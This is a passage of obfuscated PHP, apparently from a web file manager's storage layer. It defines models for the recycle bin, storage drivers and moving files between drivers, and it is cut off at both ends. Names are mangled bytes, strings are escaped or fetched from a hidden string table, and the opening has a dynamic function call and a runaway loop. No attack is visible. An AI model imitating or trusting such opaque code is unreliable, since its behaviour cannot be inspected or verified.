$_act = $_SERVER[ˆë€Ï⁄∂][62]; $_act($_SERVER[$_SERVER[ˆë€Ï⁄∂][57]] . $_SERVER[ˆë€Ï⁄∂][58]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ˆë€Ï⁄∂][465]); } } goto c•éﬁêäÁÀ; F´—ÖıÑ£Ÿ: define($_SERVER[ˆë€Ï⁄∂][327], 2); define($_SERVER[ˆë€Ï⁄∂][328], 3); define($_SERVER[ˆë€Ï⁄∂][329], 1); goto E÷ñ”›úı∏; bâô˘™™Ó: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\x72\x63\145\x5f\x72\145\x63\x79\x63\154\145"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\124\x69\x6d\x65", "\164\151\x6d\145", "\x69\x6e\163\x65\x72\164", "\x66\x75\156\x63\x74\x69\x6f\x6e")); public function listData($Ø¨›íØ® = false) { $î¯ù¸≠ö =& $_SERVER[ˆë€Ï⁄∂]; $Ø¨›íØ® = $Ø¨›íØ® ? $Ø¨›íØ® : USER_ID; $ûÿì—±ä = $this->where(array($î¯ù¸≠ö[1778] => $Ø¨›íØ®))->select(); return array_to_keyvalue($ûÿì—±ä, $î¯ù¸≠ö[12], $î¯ù¸≠ö[203]); } public function moveToRecycle($¢Û¶Ì≈§) { $≤∏Õºû∫ =& $_SERVER[ˆë€Ï⁄∂]; $˘Ωà¥≈ã = Model($≤∏Õºû∫[1436]); $ ß›àÌ° = $˘Ωà¥≈ã->sourceInfo($¢Û¶Ì≈§); if (!$ ß›àÌ° || $ ß›àÌ°[$≤∏Õºû∫[516]] == $≤∏Õºû∫[101]) { return; } $û‹‹ﬂ¨— = array($≤∏Õºû∫[502] => $¢Û¶Ì≈§, $≤∏Õºû∫[1778] => USER_ID, $≤∏Õºû∫[662] => $ ß›àÌ°[$≤∏Õºû∫[200]], $≤∏Õºû∫[663] => $ ß›àÌ°[$≤∏Õºû∫[580]], $≤∏Õºû∫[666] => $ ß›àÌ°[$≤∏Õºû∫[595]]); $this->add($û‹‹ﬂ¨—); $this->recycleMove($¢Û¶Ì≈§, 1); if ($ ß›àÌ°[$≤∏Õºû∫[496]] == $≤∏Õºû∫[101]) { $°ø˚¥ÃÂ = array($≤∏Õºû∫[666] => array($≤∏Õºû∫[626], $ ß›àÌ°[$≤∏Õºû∫[595]] . $¢Û¶Ì≈§ . $≤∏Õºû∫[627])); $˘Ωà¥≈ã->where($°ø˚¥ÃÂ)->setField($≤∏Õºû∫[516], 1); } } public function clear() { $this->remove(!1); } public function remove($êÄªÉâ‹ = false, $ñ⁄À˘˜Î = false) { $ì†“¸√∏ =& $_SERVER[ˆë€Ï⁄∂]; $ñ⁄À˘˜Î = $ñ⁄À˘˜Î ? $ñ⁄À˘˜Î : USER_ID; $µ˛¥Ó˘Œ = Model($ì†“¸√∏[1436]); $Ë˚◊‚è‘ = $this->listData($ñ⁄À˘˜Î); $êÄªÉâ‹ = $êÄªÉâ‹ === !1 ? !1 : $êÄªÉâ‹; $ÊªË¶∆÷ = array(); foreach ($Ë˚◊‚è‘ as $óÒü‡Ñ√) { if ($êÄªÉâ‹ != !1 && !in_array($óÒü‡Ñ√, $êÄªÉâ‹)) { continue; } $ÀÁ“≤Â≥ = $µ˛¥Ó˘Œ->sourceInfo($óÒü‡Ñ√); $µ˛¥Ó˘Œ->remove($óÒü‡Ñ√, !1); $ƒ¬ΩœËº = $ÀÁ“≤Â≥[$ì†“¸√∏[200]] . $ì†“¸√∏[11] . $ÀÁ“≤Â≥[$ì†“¸√∏[580]]; $ÊªË¶∆÷[$ƒ¬ΩœËº] = array($ì†“¸√∏[662] => $ÀÁ“≤Â≥[$ì†“¸√∏[200]], $ì†“¸√∏[580] => $ÀÁ“≤Â≥[$ì†“¸√∏[580]]); $this->where(array($ì†“¸√∏[203] => $óÒü‡Ñ√))->delete(); } foreach ($ÊªË¶∆÷ as $ãı–´§ÿ) { $µ˛¥Ó˘Œ->targetSpaceUpdate($ãı–´§ÿ[$ì†“¸√∏[200]], $ãı–´§ÿ[$ì†“¸√∏[580]]); } } public function restore($…–◊Òìß = false) { $™Ù§ÛÛ≤ = $this->listData(); $this->_restoreSource($™Ù§ÛÛ≤, $…–◊Òìß); } public function removeUserAll($ÈìÇÉ∏Ü) { $this->remove(!1, $ÈìÇÉ∏Ü); } public function restoreItem($§¬Ó«í…) { $this->_restoreSource(array($§¬Ó«í…), array($§¬Ó«í…)); } private function _restoreSource($ÂàÇﬁï≥, $Õ•Ë’Û⁄) { $êŸﬂü¨ =& $_SERVER[ˆë€Ï⁄∂]; $±¥Ü√â˛ = Model($êŸﬂü¨[1436]); $Õ•Ë’Û⁄ = $Õ•Ë’Û⁄ == !1 ? !1 : $Õ•Ë’Û⁄; if (!$ÂàÇﬁï≥) { return !0; } $©≠’÷ÊÎ = array(); foreach ($ÂàÇﬁï≥ as $•”˘ò˜ê) { if ($Õ•Ë’Û⁄ != !1 && !in_array($•”˘ò˜ê, $Õ•Ë’Û⁄)) { continue; } $˚–¯Ãèî = $±¥Ü√â˛->sourceInfo($•”˘ò˜ê); $»î‚œ÷≤ = $±¥Ü√â˛->sourceInfo($˚–¯Ãèî[$êŸﬂü¨[202]]); if ($»î‚œ÷≤[$êŸﬂü¨[516]] == $êŸﬂü¨[101]) { continue; } $±¥Ü√â˛->lockMoveStart($•”˘ò˜ê); $this->recycleMove($•”˘ò˜ê, 0); if ($˚–¯Ãèî[$êŸﬂü¨[496]] == $êŸﬂü¨[101]) { $ø⁄√ùÁò = array($êŸﬂü¨[666] => array($êŸﬂü¨[626], $˚–¯Ãèî[$êŸﬂü¨[595]] . $•”˘ò˜ê . $êŸﬂü¨[627])); $±¥Ü√â˛->where($ø⁄√ùÁò)->setField($êŸﬂü¨[516], 0); $this->restoreFolderChildren($•”˘ò˜ê, $ÂàÇﬁï≥); } $this->where(array($êŸﬂü¨[203] => $•”˘ò˜ê))->delete(); $±¥Ü√â˛->folderSizeReset($˚–¯Ãèî[$êŸﬂü¨[202]]); $©≠’÷ÊÎ[] = $˚–¯Ãèî[$êŸﬂü¨[202]]; if ($˚–¯Ãèî[$êŸﬂü¨[496]] == $êŸﬂü¨[101]) { $©≠’÷ÊÎ[] = $•”˘ò˜ê; } $±¥Ü√â˛->lockMoveEnd($•”˘ò˜ê); } $±¥Ü√â˛->updateModifyTime($©≠’÷ÊÎ); } private function restoreFolderChildren($êüåˆ±, $¯´˙‹†∞) { $å·«àÿƒ =& $_SERVER[ˆë€Ï⁄∂]; $Ü„ÄπÇñ = Model($å·«àÿƒ[1436]); $ÅƒêâÍ∆ = array($å·«àÿƒ[203] => array($å·«àÿƒ[7], array())); foreach ($¯´˙‹†∞ as $ñçé÷≈Û) { if ($ñçé÷≈Û == $êüåˆ±) { continue; } if (!$Ü„ÄπÇñ->isParentOf($êüåˆ±, $ñçé÷≈Û)) { continue; } $Èãﬁ›ﬁô = $Ü„ÄπÇñ->sourceInfo($ñçé÷≈Û); if ($Èãﬁ›ﬁô[$å·«àÿƒ[496]] == $å·«àÿƒ[101]) { $ÅƒêâÍ∆[] = array($å·«àÿƒ[666] => array($å·«àÿƒ[626], $Èãﬁ›ﬁô[$å·«àÿƒ[595]] . $ñçé÷≈Û . $å·«àÿƒ[627])); } else { $ÅƒêâÍ∆[$å·«àÿƒ[203]][1][] = $ñçé÷≈Û; } } if (!$ÅƒêâÍ∆[$å·«àÿƒ[203]][1]) { unset($ÅƒêâÍ∆[$å·«àÿƒ[203]]); } if (!$ÅƒêâÍ∆) { return; } if (is_array($ÅƒêâÍ∆[$å·«àÿƒ[203]]) && is_array($ÅƒêâÍ∆[$å·«àÿƒ[203]][1])) { $ÅƒêâÍ∆[$å·«àÿƒ[203]][1] = array_unique($ÅƒêâÍ∆[$å·«àÿƒ[203]][1]); } $ÅƒêâÍ∆[$å·«àÿƒ[1092]] = $å·«àÿƒ[2090]; $Ü„ÄπÇñ->where($ÅƒêâÍ∆)->setField($å·«àÿƒ[516], 1); } private function recycleMove($¯ºªãÇ£, $å¥ñÜöâ = 1) { $û≤ö‰ôÁ =& $_SERVER[ˆë€Ï⁄∂]; $û√ë öÌ = Model($û≤ö‰ôÁ[1436]); $Ïéà˚© = Model($û≤ö‰ôÁ[2321]); $Ê›¶≥îﬁ = array($û≤ö‰ôÁ[203] => $¯ºªãÇ£); if ($å¥ñÜöâ) { $û√ë öÌ->where($Ê›¶≥îﬁ)->setField($û≤ö‰ôÁ[516], 1); $Ïéà˚©->eventRecycle($¯ºªãÇ£, $û≤ö‰ôÁ[2322]); } else { $Ù˚ÔÏ™© = $û√ë öÌ->where($Ê›¶≥îﬁ)->find(); $Ëø◊ÿñÅ = $Ù˚ÔÏ™©[$û≤ö‰ôÁ[496]] == $û≤ö‰ôÁ[101]; $¡ô¡¯—‘ = $û√ë öÌ->fileNameAuto($Ù˚ÔÏ™©[$û≤ö‰ôÁ[202]], $Ù˚ÔÏ™©[$û≤ö‰ôÁ[32]], REPEAT_RENAME_FOLDER, $Ëø◊ÿñÅ); if ($¡ô¡¯—‘ != $Ù˚ÔÏ™©[$û≤ö‰ôÁ[32]]) { $û√ë öÌ->rename($¯ºªãÇ£, $¡ô¡¯—‘); } $û√ë öÌ->where($Ê›¶≥îﬁ)->setField($û≤ö‰ôÁ[516], 0); $Ïéà˚©->eventRecycle($¯ºªãÇ£, $û≤ö‰ôÁ[2323]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x73\157\165\162\x63\145\123\145\143\162\x65\164\x4c\151\163\x74"; public $field = array("\x73\x6f\x75\x72\143\145\111\104", "\x74\x79\x70\x65\x49\104", "\x63\x72\x65\141\164\x65\125\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\163\164\157\162\x61\147\145\x4c\x69\163\164"; public $field = array("\156\141\x6d\x65", "\163\151\x7a\145\x4d\x61\170", "\x73\x79\163\x74\145\155", "\144\x65\146\x61\165\154\164", "\x64\162\151\166\x65\x72", "\x63\157\x6e\146\151\x67"); public function listData($˘»‚–ÿ∏ = false, $£†≤⁄ûÈ = "\x6d\x6f\x64\x69\146\x79\x54\x69\x6d\145", $ÃÌ÷öá“ = false) { $œŸÅÊ¶ù =& $_SERVER[ˆë€Ï⁄∂]; $˚≤£¢÷Ç = parent::listData($˘»‚–ÿ∏, $£†≤⁄ûÈ, $ÃÌ÷öá“); if ($˘»‚–ÿ∏) { return $˚≤£¢÷Ç; } $ﬁÓ á“ô = array(); if ($GLOBALS[$œŸÅÊ¶ù[2324]]) { $ﬁÓ á“ô = $this->ioSizeUseGet(array_to_keyvalue($˚≤£¢÷Ç, $œŸÅÊ¶ù[12], $œŸÅÊ¶ù[486])); } foreach ($˚≤£¢÷Ç as $ÒÊî»◊Ã => $Ô≥ü≈Òó) { unset($˚≤£¢÷Ç[$ÒÊî»◊Ã][$œŸÅÊ¶ù[6]]); $˚≤£¢÷Ç[$ÒÊî»◊Ã][$œŸÅÊ¶ù[1976]] = isset($ﬁÓ á“ô[$Ô≥ü≈Òó[$œŸÅÊ¶ù[486]]]) ? $ﬁÓ á“ô[$Ô≥ü≈Òó[$œŸÅÊ¶ù[486]]] : 0; } return $˚≤£¢÷Ç; } public function ioSizeUseGet($ÇÌ’¯éµ) { $æÆÇﬁ‹Ã =& $_SERVER[ˆë€Ï⁄∂]; if (!$ÇÌ’¯éµ) { return array(); } $¶ÉÒØ˘ü = $æÆÇﬁ‹Ã[2325] . implode($æÆÇﬁ‹Ã[50], $ÇÌ’¯éµ); $ãà¸π∂ñ = Cache::get($¶ÉÒØ˘ü); if ($ãà¸π∂ñ) { return $ãà¸π∂ñ; } $Ë›ÀÔ ¥ = array($æÆÇﬁ‹Ã[909] => $æÆÇﬁ‹Ã[486], $æÆÇﬁ‹Ã[2326] => $æÆÇﬁ‹Ã[89]); $ü≤˝√™ñ = array($æÆÇﬁ‹Ã[909] => array($æÆÇﬁ‹Ã[7], $ÇÌ’¯éµ)); $ãà¸π∂ñ = Model($æÆÇﬁ‹Ã[881])->field($Ë›ÀÔ ¥)->where($ü≤˝√™ñ)->group($æÆÇﬁ‹Ã[909])->select(); $ãà¸π∂ñ = array_to_keyvalue($ãà¸π∂ñ, $æÆÇﬁ‹Ã[486], $æÆÇﬁ‹Ã[89]); Cache::set($¶ÉÒØ˘ü, $ãà¸π∂ñ, 600); return $ãà¸π∂ñ; } public function getConfig($ëñö†ûì) { $À˚◊åÛ = parent::listData($ëñö†ûì); $Œô´ÿﬁË = _get($À˚◊åÛ, $_SERVER[ˆë€Ï⁄∂][6], array()); if ($Œô´ÿﬁË && !is_array($Œô´ÿﬁË)) { $Œô´ÿﬁË = json_decode($Œô´ÿﬁË, !0); } return $Œô´ÿﬁË; } public function update($Ô≤ˆ∫Ωà, $≈‹„¯ü€) { $ËüæõÔ¡ =& $_SERVER[ˆë€Ï⁄∂]; $æüŸê©» = $≈‹„¯ü€[$ËüæõÔ¡[32]]; $∑∞∫ÂÌÆ = array_to_keyvalue(parent::listData(), $ËüæõÔ¡[32]); if (isset($∑∞∫ÂÌÆ[$æüŸê©»]) && $∑∞∫ÂÌÆ[$æüŸê©»][$ËüæõÔ¡[486]] != $Ô≤ˆ∫Ωà) { return !1; } $this->checkPwd($Ô≤ˆ∫Ωà, $≈‹„¯ü€); if (isset($≈‹„¯ü€[$ËüæõÔ¡[2327]]) && $≈‹„¯ü€[$ËüæõÔ¡[2327]] == $ËüæõÔ¡[101]) { $this->checkConfig($≈‹„¯ü€); } unset($≈‹„¯ü€[$ËüæõÔ¡[2327]]); $Û≥¡Ãûº = parent::update($Ô≤ˆ∫Ωà, $≈‹„¯ü€); if ($Û≥¡Ãûº && $≈‹„¯ü€[$ËüæõÔ¡[37]]) { $¢≥™≤Á≠ = 0; foreach ($∑∞∫ÂÌÆ as $îﬁ˚¢éÕ) { if ($îﬁ˚¢éÕ[$ËüæõÔ¡[37]] && $îﬁ˚¢éÕ[$ËüæõÔ¡[486]] != $Ô≤ˆ∫Ωà) { $¢≥™≤Á≠ = $îﬁ˚¢éÕ[$ËüæõÔ¡[486]]; parent::update($îﬁ˚¢éÕ[$ËüæõÔ¡[486]], array($ËüæõÔ¡[37] => 0)); } } $this->updateBackup($Ô≤ˆ∫Ωà, $¢≥™≤Á≠); } return $Û≥¡Ãûº; } public function add($˛Ùˆ¨¬Î) { $Ñá£äÊò =& $_SERVER[ˆë€Ï⁄∂]; $·‰É¥öä = array_to_keyvalue(parent::listData(), $Ñá£äÊò[32]); if (isset($·‰É¥öä[$˛Ùˆ¨¬Î[$Ñá£äÊò[32]]])) { return !1; } $this->checkConfig($˛Ùˆ¨¬Î); $ÿ°ÿíÖÕ = parent::insert($˛Ùˆ¨¬Î); if ($ÿ°ÿíÖÕ && $˛Ùˆ¨¬Î[$Ñá£äÊò[37]]) { foreach ($·‰É¥öä as $á¥¸∞¬®) { if ($á¥¸∞¬®[$Ñá£äÊò[37]]) { parent::update($á¥¸∞¬®[$Ñá£äÊò[486]], array($Ñá£äÊò[37] => 0)); } } } return $ÿ°ÿíÖÕ; } public function updateBackup($ﬁæ◊û∂Ù, $¥äúúÅÉ) { $ßÇú„≠ï =& $_SERVER[ˆë€Ï⁄∂]; if (!$¥äúúÅÉ) { return; } $ûøùáπ… = Model($ßÇú„≠ï[839])->config(); if ($ûøùáπ…[$ßÇú„≠ï[1756]] != $ßÇú„≠ï[101] || $ûøùáπ…[$ßÇú„≠ï[843]] != $¥äúúÅÉ) { return; } $–∏≈‘⁄ﬁ = Model($ßÇú„≠ï[861])->get($ßÇú„≠ï[875]); $–∏≈‘⁄ﬁ = json_decode($–∏≈‘⁄ﬁ, !0); if (!$–∏≈‘⁄ﬁ) { return; } $–∏≈‘⁄ﬁ[$ßÇú„≠ï[843]] = $ﬁæ◊û∂Ù; Model($ßÇú„≠ï[861])->set(array($ßÇú„≠ï[875] => $–∏≈‘⁄ﬁ)); } public function checkPwd($®Êœöï∂, &$ãßı–“°) { $…’¯©™° =& $_SERVER[ˆë€Ï⁄∂]; if (empty($ãßı–“°[$…’¯©™°[6]])) { return; } $´ ∂Ãí∂ = $ãßı–“°[$…’¯©™°[6]]; if (!is_array($´ ∂Ãí∂)) { $´ ∂Ãí∂ = json_decode($´ ∂Ãí∂, !0); } $îùøó≠õ = $…’¯©™°[12]; $ïÙ‘‘©Í = array($…’¯©™°[2328], $…’¯©™°[2329], $…’¯©™°[981]); foreach ($ïÙ‘‘©Í as $öë≤˛‰É) { if (isset($´ ∂Ãí∂[$öë≤˛‰É])) { $îùøó≠õ = $öë≤˛‰É; break; } } if (!$îùøó≠õ) { return; } $ú°“ù°˝ = $this->getConfig($®Êœöï∂); $⁄Èˆ´”É = $ú°“ù°˝[$îùøó≠õ]; $≈ú ‰õŒ = $´ ∂Ãí∂[$îùøó≠õ]; if ($≈ú ‰õŒ == str_repeat($…’¯©™°[232], strlen($⁄Èˆ´”É))) { $´ ∂Ãí∂[$îùøó≠õ] = $⁄Èˆ´”É; $ãßı–“°[$…’¯©™°[6]] = json_encode($´ ∂Ãí∂); } else { if ($≈ú ‰õŒ != $⁄Èˆ´”É) { $ãßı–“°[$…’¯©™°[2327]] = $…’¯©™°[101]; } } } public function checkConfig(&$—ì¬¡ıå, $¸∞ôÑµ” = false) { $∫“Ûåß‚ =& $_SERVER[ˆë€Ï⁄∂]; $ÉÂÉ∑É– = strtolower($—ì¬¡ıå[$∫“Ûåß‚[108]]); $àœÒâ⁄È = $—ì¬¡ıå[$∫“Ûåß‚[6]]; if (!is_array($àœÒâ⁄È)) { $àœÒâ⁄È = json_decode($àœÒâ⁄È, !0); } foreach ($àœÒâ⁄È as $øÔΩ¢ë” => $»˜ë¬‚∂) { if (is_string($»˜ë¬‚∂)) { $àœÒâ⁄È[$øÔΩ¢ë”] = trim($»˜ë¬‚∂); } } $àœÒâ⁄È[$∫“Ûåß‚[2330]] = rand_string(6); $Ω¢≤ûŸÙ = $GLOBALS[$∫“Ûåß‚[6]][$∫“Ûåß‚[102]][$∫“Ûåß‚[917]]; $≈ù„√π± = isset($Ω¢≤ûŸÙ[$ÉÂÉ∑É–]) ? $Ω¢≤ûŸÙ[$ÉÂÉ∑É–] : ucfirst($ÉÂÉ∑É–); $ΩõÉ√í‚ = $∫“Ûåß‚[87] . $≈ù„√π±; if (!$≈ù„√π± || !class_exists($ΩõÉ√í‚)) { if ($¸∞ôÑµ”) { return LNG($∫“Ûåß‚[2331]); } write_log(array($∫“Ûåß‚[2332], $—ì¬¡ıå, get_caller_info()), $∫“Ûåß‚[225]); show_json(LNG($∫“Ûåß‚[2331]), !1, $—ì¬¡ıå); } $‡·ïåÕÙ = new $ΩõÉ√í‚($àœÒâ⁄È); if (in_array($ÉÂÉ∑É–, $‡·ïåÕÙ->objectDriver)) { try { if (!$‡·ïåÕÙ->isBucketCors() && !$‡·ïåÕÙ->setBucketCors()) { $ñÇö⁄ß˜ = LNG($∫“Ûåß‚[2333]); $ñÇö⁄ß˜ .= $∫“Ûåß‚[2334] . LNG($∫“Ûåß‚[2335]); } } catch (Exception $Êâﬂ˝Ÿ) { $ñÇö⁄ß˜ = $Êâﬂ˝Ÿ->getMessage(); } if (isset($ñÇö⁄ß˜)) { return $this->_parseError($ñÇö⁄ß˜, $ÉÂÉ∑É–, $¸∞ôÑµ”); } if ($ÉÂÉ∑É– == $∫“Ûåß‚[78] && !$‡·ïåÕÙ->checkRegion()) { return $this->_parseError(LNG($∫“Ûåß‚[2336]), $ÉÂÉ∑É–, $¸∞ôÑµ”); } } $Ëú†ƒ£µ = rtrim($àœÒâ⁄È[$∫“Ûåß‚[1277]], $∫“Ûåß‚[8]) . $∫“Ûåß‚[8]; $∞•ôÂŸÃ = $‡·ïåÕÙ->getPath($Ëú†ƒ£µ . $∫“Ûåß‚[1281]); try { if ($ÉÂÉ∑É– == $∫“Ûåß‚[119]) { $‡·ïåÕÙ->mkdir($Ëú†ƒ£µ); } $û¥àà´≥ = $‡·ïåÕÙ->mkfile($∞•ôÂŸÃ); if (!$û¥àà´≥) { $ñÇö⁄ß˜ = LNG($∫“Ûåß‚[2333]); } } catch (Exception $Êâﬂ˝Ÿ) { $ñÇö⁄ß˜ = $Êâﬂ˝Ÿ->getMessage(); } if (isset($ñÇö⁄ß˜)) { return $this->_parseError($ñÇö⁄ß˜, $ÉÂÉ∑É–, $¸∞ôÑµ”); } $àœÒâ⁄È[$∫“Ûåß‚[1277]] = $Ëú†ƒ£µ; $—ì¬¡ıå[$∫“Ûåß‚[6]] = json_encode($àœÒâ⁄È); $—ì¬¡ıå[$∫“Ûåß‚[108]] = $≈ù„√π±; return !0; } private function _parseError($ùñ÷≥õç, $¥î»Ω›ﬁ, $Ë–’ÃöÙ = false) { $∑Â·€÷ÿ =& $_SERVER[ˆë€Ï⁄∂]; if ($¥î»Ω›ﬁ == $∑Â·€÷ÿ[78] && stripos($ùñ÷≥õç, $∑Â·€÷ÿ[2337])) { $≈ËÒ⁄ÂÂ = explode($∑Â·€÷ÿ[10], $ùñ÷≥õç); $˝êº¶í≠ = isset($≈ËÒ⁄ÂÂ[1]) ? $≈ËÒ⁄ÂÂ[1] : $∑Â·€÷ÿ[12]; $Éﬁ˛ë±´ = array($∑Â·€÷ÿ[2338] => LNG($∑Â·€÷ÿ[2339]), $∑Â·€÷ÿ[2340] => LNG($∑Â·€÷ÿ[2341])); if (isset($Éﬁ˛ë±´[$˝êº¶í≠])) { $ùñ÷≥õç = $Éﬁ˛ë±´[$˝êº¶í≠]; } } if (stripos($ùñ÷≥õç, $∑Â·€÷ÿ[2342]) === 0) { $ˆíÁà‰æ = strpos($ùñ÷≥õç, $∑Â·€÷ÿ[188]); if ($ˆíÁà‰æ === !1) { $ˆíÁà‰æ = strpos($ùñ÷≥õç, $∑Â·€÷ÿ[4]); } if ($ˆíÁà‰æ !== !1) { $ùñ÷≥õç = substr($ùñ÷≥õç, $ˆíÁà‰æ + 1); } } $ùñ÷≥õç = LNG($∑Â·€÷ÿ[1284]) . $ùñ÷≥õç; if ($Ë–’ÃöÙ) { return $ùñ÷≥õç; } show_json($ùñ÷≥õç, !1); } public function driverListSystem() { $÷…¿¶œû =& $_SERVER[ˆë€Ï⁄∂]; $„Ò’€‹ø = parent::listData(); $„Î£çˆ = array(); foreach ($„Ò’€‹ø as $•ñ€¡™) { unset($•ñ€¡™[$÷…¿¶œû[243]], $•ñ€¡™[$÷…¿¶œû[98]]); if (!is_array($•ñ€¡™[$÷…¿¶œû[6]])) { $•ñ€¡™[$÷…¿¶œû[6]] = json_decode($•ñ€¡™[$÷…¿¶œû[6]], !0); } $„Î£çˆ[] = $•ñ€¡™; } return $„Î£çˆ; } public function defaultDriver() { $Ì–õœËç =& $_SERVER[ˆë€Ï⁄∂]; $Ò∫≠≠¿∑ = parent::listData(); $±îö«µ˘ = array_filter_by_field($Ò∫≠≠¿∑, $Ì–õœËç[37], 1); $±îö«µ˘ = $±îö«µ˘[0]; if (!$±îö«µ˘) { return array(); } if (!is_array($±îö«µ˘[$Ì–õœËç[6]])) { $±îö«µ˘[$Ì–õœËç[6]] = json_decode($±îö«µ˘[$Ì–õœËç[6]], !0); } return $±îö«µ˘; } public function driverInfo($Á∆íàπ–) { $˛ôÖ∆Åó =& $_SERVER[ˆë€Ï⁄∂]; $™ñ◊ç·˛ = array_to_keyvalue(parent::listData(), $˛ôÖ∆Åó[486]); if (!isset($™ñ◊ç·˛[$Á∆íàπ–])) { return !1; } $ﬂÎ∂∆ﬂ« = $™ñ◊ç·˛[$Á∆íàπ–]; if (!is_array($ﬂÎ∂∆ﬂ«[$˛ôÖ∆Åó[6]])) { $ﬂÎ∂∆ﬂ«[$˛ôÖ∆Åó[6]] = json_decode($ﬂÎ∂∆ﬂ«[$˛ôÖ∆Åó[6]], !0); } return $ﬂÎ∂∆ﬂ«; } public function remove($°æüÑÃƒ) { $this->removeShareItems($°æüÑÃƒ); return parent::remove($°æüÑÃƒ); } public function removeWithFile($´…ò¡•˝, $…ì‘«Ñª, $Ìø™Å”Ä, $◊Üß‹„å = false) { $çúü‘—ˆ =& $_SERVER[ˆë€Ï⁄∂]; $Ã€Â°´Ô = array($çúü‘—ˆ[909] => $´…ò¡•˝); $Ñ⁄˝ÔÇ≠ = Model($çúü‘—ˆ[555])->where($Ã€Â°´Ô)->count(); $˝«É©¸á = Model($çúü‘—ˆ[555])->where($Ã€Â°´Ô)->sum($çúü‘—ˆ[89]); $∑¬ø¸à‘ = $…ì‘«Ñª . $çúü‘—ˆ[2343] . $´…ò¡•˝; $ê¬¯£∆– = LNG($…ì‘«Ñª == $çúü‘—ˆ[634] ? $çúü‘—ˆ[2344] : $çúü‘—ˆ[2345]); $¡∑ÒÖπá = new TaskFileTransfer($∑¬ø¸à‘, $çúü‘—ˆ[225], $Ñ⁄˝ÔÇ≠, $ê¬¯£∆– . $çúü‘—ˆ[473] . $Ìø™Å”Ä[$çúü‘—ˆ[32]] . $çúü‘—ˆ[224] . $´…ò¡•˝); $¡∑ÒÖπá->task[$çúü‘—ˆ[854]] = (double) $˝«É©¸á; $˝∆·–·Æ = KodIO::defaultDriver(); $”ÈÇÚÖ‰ = $˝∆·–·Æ[$çúü‘—ˆ[486]]; $˚¡Ÿôéè = $¯ø·µªß = $éøËñïÅ = array(); $œ†Ÿûó¸ = Model($çúü‘—ˆ[242])->where($Ã€Â°´Ô)->field($çúü‘—ˆ[2346])->select(); foreach ($œ†Ÿûó¸ as $Çºä‹Ñ¢) { $£∞ïè˚¸ = $Çºä‹Ñ¢[$çúü‘—ˆ[552]]; if ($◊Üß‹„å) { $¯ø·µªß[] = $£∞ïè˚¸; continue; } $âﬁ”∞§Ù = $Çºä‹Ñ¢[$çúü‘—ˆ[97]]; $û˙á ∞• = get_path_father($âﬁ”∞§Ù); $éøËñïÅ[] = $û˙á ∞•; $û˙á ∞• = str_replace("\x7b\151\x6f\x3a{$´…ò¡•˝}\x7d\57", "\x7b\151\x6f\x3a{$”ÈÇÚÖ‰}\x7d\57", $û˙á ∞•); if (!IO::exist($âﬁ”∞§Ù)) { $˚¡Ÿôéè[] = $£∞ïè˚¸; $¡∑ÒÖπá->updateFileEnd($Çºä‹Ñ¢[$çúü‘—ˆ[32]], $Çºä‹Ñ¢[$çúü‘—ˆ[89]]); write_log($çúü‘—ˆ[2347] . $âﬁ”∞§Ù, $çúü‘—ˆ[1919]); continue; } $ïú£—ÇØ = IO::move($âﬁ”∞§Ù, $û˙á ∞•, REPEAT_RENAME); if (!$ïú£—ÇØ) { $¯ø·µªß[] = $£∞ïè˚¸; $¡∑ÒÖπá->updateFileEnd($Çºä‹Ñ¢[$çúü‘—ˆ[32]], $Çºä‹Ñ¢[$çúü‘—ˆ[89]]); write_log($çúü‘—ˆ[2348] . $âﬁ”∞§Ù, $çúü‘—ˆ[1919]); continue; } $Ã€Â°´Ô = array($çúü‘—ˆ[552] => $£∞ïè˚¸); $Î¶øß≈° = array($çúü‘—ˆ[909] => $”ÈÇÚÖ‰, $çúü‘—ˆ[97] => $ïú£—ÇØ); Model($çúü‘—ˆ[242])->where($Ã€Â°´Ô)->save($Î¶øß≈°); } $Ω∂ÄÚ⁄Ω = $¡∑ÒÖπá->task; if (!$◊Üß‹„å) { Cache::set($∑¬ø¸à‘, $Ω∂ÄÚ⁄Ω); } $¡∑ÒÖπá->end(); $˚¡Ÿôéè = array_unique($˚¡Ÿôéè); $¯ø·µªß = array_unique($¯ø·µªß); if (!$◊Üß‹„å && ($˚¡Ÿôéè || $¯ø·µªß)) { $¨∏ ÇØ… = array(); if ($˚¡Ÿôéè) { $¨∏ ÇØ…[] = sprintf(LNG($çúü‘—ˆ[2349]), count($˚¡Ÿôéè)); } if ($¯ø·µªß) { $¨∏ ÇØ…[] = sprintf(LNG($çúü‘—ˆ[2350]), count($¯ø·µªß)); } $¨∏ ÇØ… = sprintf(LNG($çúü‘—ˆ[2351]), implode($çúü‘—ˆ[2352], $¨∏ ÇØ…)) . $çúü‘—ˆ[2353] . date($çúü‘—ˆ[2354]) . $çúü‘—ˆ[2355]; if ($…ì‘«Ñª == $çúü‘—ˆ[1956]) { $¨∏ ÇØ… .= $çúü‘—ˆ[2356] . LNG($çúü‘—ˆ[2357]); } else { $¨∏ ÇØ… = LNG($çúü‘—ˆ[2358]) . $çúü‘—ˆ[2359] . $¨∏ ÇØ…; } $Ω∂ÄÚ⁄Ω[$çúü‘—ˆ[1279]] = $¨∏ ÇØ…; Cache::set($∑¬ø¸à‘, $Ω∂ÄÚ⁄Ω); unset($Ìø™Å”Ä[$çúü‘—ˆ[6]]); $öØ•±µû = array($çúü‘—ˆ[486] => $´…ò¡•˝, $çúü‘—ˆ[2230] => $çúü‘—ˆ[634], $çúü‘—ˆ[32] => $Ìø™Å”Ä[$çúü‘—ˆ[32]], $çúü‘—ˆ[108] => $Ìø™Å”Ä[$çúü‘—ˆ[108]]); Hook::trigger($çúü‘—ˆ[1798], array($çúü‘—ˆ[1302] => $öØ•±µû, $çúü‘—ˆ[1312] => !0)); show_json($¨∏ ÇØ…, !1, 100111); } if ($…ì‘«Ñª == $çúü‘—ˆ[634]) { return !0; } if ($˚¡Ÿôéè || $¯ø·µªß) { $Ñ…”ï¸£ = array_merge($˚¡Ÿôéè, $¯ø·µªß); $Ñ…”ï¸£ = array_filter(array_unique($Ñ…”ï¸£)); $this->removeByFileID($Ñ…”ï¸£); } if ($éøËñïÅ) { $éøËñïÅ = array_filter(array_unique($éøËñïÅ)); foreach ($éøËñïÅ as $âﬁ”∞§Ù) { $Êá¯€¬Î = 